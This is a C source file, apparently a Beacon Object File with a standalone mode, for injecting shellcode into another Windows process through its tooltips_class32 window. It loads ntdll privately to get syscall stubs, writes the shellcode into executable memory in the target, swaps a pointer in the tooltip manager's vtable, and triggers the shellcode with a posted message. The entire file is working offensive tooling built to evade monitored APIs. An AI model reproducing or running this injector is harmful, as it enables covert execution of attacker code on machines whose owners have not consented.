#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include "beacon.h"
#include "bofdefs.h"
#include "ntdefs.h"
#include "base.c"
#include "injection.c"

typedef struct _IUnknown_VFT {
    // IUnknown
    LPVOID QueryInterface;
    LPVOID AddRef;
    LPVOID Release;
    
    // CToolTipsMgr
    LPVOID ptrs[128];
} IUnknown_VFT;

DWORD tooltip(PROCESS_INFORMATION* lpProcessInfo, LPBYTE lpShellcodeBuffer, DWORD dwShellcodeBufferSize)
{
    DWORD  dwErrorCode = ERROR_SUCCESS;
    HWND hWnd = NULL;
    DWORD dwProcessId = 0;
    PHMOD hNTDLL = NULL;
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = NULL;
    NtReadVirtualMemory_t NtReadVirtualMemory = NULL;
    NtWriteVirtualMemory_t NtWriteVirtualMemory = NULL;
    NtFreeVirtualMemory_t     NtFreeVirtualMemory = NULL;
    SIZE_T RegionSize = 0;
    LPVOID lpRemoteShellcodeBuffer = NULL;
    LPVOID lpRemoteIUnknown_VFT = NULL;
    LPVOID lpHeap = NULL;
    LPVOID lpvfTable = NULL;
    IUnknown_VFT unk;
 
 /*
    internal_printf("hThread:               %p\n", lpProcessInfo->hThread);
    internal_printf("hProcess:              %p\n", lpProcessInfo->hProcess);
    internal_printf("dwProcessId:           %u\n", lpProcessInfo->dwProcessId);
    internal_printf("dwThreadId:            %u\n", lpProcessInfo->dwThreadId);
    internal_printf("lpShellcodeBuffer:     %p\n", lpShellcodeBuffer);
    internal_printf("dwShellcodeBufferSize: %lu\n", dwShellcodeBufferSize);
*/

    // Custom LoadLibrary on NTDLL
    hNTDLL = _LoadLibrary(NTDLL_PATH);
    if(NULL == hNTDLL) { goto end; }

    // Get the syscall addresses
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSyscallStub(hNTDLL, "NtAllocateVirtualMemory");
    NtReadVirtualMemory = (NtReadVirtualMemory_t)GetSyscallStub(hNTDLL, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetSyscallStub(hNTDLL, "NtWriteVirtualMemory");
    NtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetSyscallStub(hNTDLL, "NtFreeVirtualMemory");
    if ((NULL == NtAllocateVirtualMemory) || 
        (NULL == NtReadVirtualMemory) || 
        (NULL == NtWriteVirtualMemory) || 
        (NULL == NtFreeVirtualMemory)
    )
    {
        dwErrorCode = ERROR_PROC_NOT_FOUND;
        internal_printf("GetSyscallStub failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get the handle to the target process's window
    do
    {
        hWnd = USER32$FindWindowExA(NULL, hWnd, "tooltips_class32", NULL);
        if ( NULL == hWnd ) { break; }
        USER32$GetWindowThreadProcessId(hWnd, &dwProcessId);
        internal_printf("tooltips_class32 found in PID:%lu\n", dwProcessId);
    }
    while (dwProcessId != lpProcessInfo->dwProcessId);
    if (NULL == hWnd)
    {
        dwErrorCode = ERROR_INVALID_WINDOW_HANDLE;
        internal_printf("Failed to find a tooltips_class32 window handle for PID:%lu\n", lpProcessInfo->dwProcessId);
        goto end;
    }

#ifdef _WIN64
    lpHeap = (LPVOID)USER32$GetWindowLongPtrA(hWnd, 0);
#else
    lpHeap = (LPVOID)USER32$GetWindowLongA(hWnd, 0);
#endif
    if (NULL == lpHeap)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("GetWindowLongPtrA failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Read in the PEB from the remote process
    dwErrorCode = NtReadVirtualMemory(
        lpProcessInfo->hProcess, 
        lpHeap, 
        &lpvfTable, 
        sizeof(ULONG_PTR), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtReadVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Read in the vftable from the remote process
    intZeroMemory(&unk, sizeof(unk));
    dwErrorCode = NtReadVirtualMemory(
        lpProcessInfo->hProcess, 
        lpvfTable, 
        &unk, 
        sizeof(unk), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtReadVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Allocate remote shellcode buffer
    RegionSize = dwShellcodeBufferSize + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        lpProcessInfo->hProcess, 
        &lpRemoteShellcodeBuffer, 
        0, 
        &RegionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Write the shellcode to the remote buffer
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpRemoteShellcodeBuffer, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize, 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Update the tooltipsmgr
    unk.AddRef = (LPVOID)lpRemoteShellcodeBuffer;

    // Allocate the new IUnknown_VFT
    RegionSize = sizeof(unk) + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        lpProcessInfo->hProcess, 
        &lpRemoteIUnknown_VFT, 
        0, 
        &RegionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Write the new IUnknown_VFT to the remote buffer
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpRemoteIUnknown_VFT, 
        &unk, 
        sizeof(unk), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Update the VFT pointer
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpHeap, 
        &lpRemoteIUnknown_VFT, 
        sizeof(ULONG_PTR), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Trigger execution
    USER32$PostMessageA(hWnd, WM_USER, 0, 0);

    KERNEL32$Sleep(10);

    // Restore the original kernel callback table
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpHeap, 
        &lpvfTable, 
        sizeof(ULONG_PTR), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

end:
    // Free remote kernel callback table
    if (lpRemoteIUnknown_VFT)
    {
        NtFreeVirtualMemory(
            lpProcessInfo->hProcess, 
            lpRemoteIUnknown_VFT, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
        lpRemoteIUnknown_VFT = NULL;
    }

    // Free remote shellcode?
    /*
    if (lpRemoteShellcodeBuffer)
    {
        NtFreeVirtualMemory(
            lpProcessInfo->hProcess, 
            lpRemoteShellcodeBuffer, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
        lpRemoteShellcodeBuffer = NULL;
    }
    */

    return dwErrorCode;
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
	datap   parser;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));
    
    // Get the arguments <PID> <SHELLCODE>
	BeaconDataParse(&parser, Buffer, Length);
    dwPid = BeaconDataInt(&parser);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
	
    if(!bofstart())
	{
		return;
	}

    // Get a handle to the injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__   
    internal_printf("tooltip( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = tooltip(
        &processInfo, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "tooltip failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

	printoutput(TRUE);
};
#else
int main(int argc, const char* argv[])
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));

    // Check to see if we received any arguments
    if (3 != argc)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }

    // Get the arguments <PID> <SHELLCODE>
    dwPid = atoi(argv[1]);
    if (USHRT_MAX < dwPid)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid PID: %s\n", argv[1]);
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }
    
    dwErrorCode = ReadFileIntoBuffer(argv[2], &lpShellcodeBuffer, &dwShellcodeBufferSize);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ReadFileIntoBuffer failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get a handle to our injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__       
    internal_printf("tooltip( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = tooltip(
        &processInfo, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "tooltip failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

    if(lpShellcodeBuffer)
    {
        intFree(lpShellcodeBuffer);
        lpShellcodeBuffer = NULL;
    }

    return dwErrorCode;
}
#endif
